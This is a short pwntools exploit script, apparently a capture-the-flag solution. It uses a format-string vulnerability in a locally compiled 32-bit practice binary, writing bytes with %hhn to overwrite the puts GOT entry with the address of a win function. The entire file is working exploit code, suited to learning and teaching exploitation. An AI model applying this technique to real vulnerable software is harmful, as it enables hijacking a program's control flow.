# gcc highson.c -o highson -no-pie -m32

from pwn import *

binary_path = './highson'
elf = ELF(binary_path)

io = gdb.debug(binary_path, '''
    b *main+67
    c
    x/20wx 0x804c014
''')

# %4$x: input
puts_got = 0x804c014
win_func = 0x08049192


payload = b''
payload += p32(puts_got) # %4$x
payload += p32(puts_got+1) # %5$x
#payload += p32(puts_got+2) # %6$x
#payload += p32(puts_got+3) # %7$x

payload += b'%138c%4$hhn'
p = 0x100 - 146
payload += ("%" + str(p) + "c").encode()

payload += b'%145c%5$hhn'

io.sendline(payload)
io.interactive()
#%7$x,%8$x,%9$x,%10$x,%11$x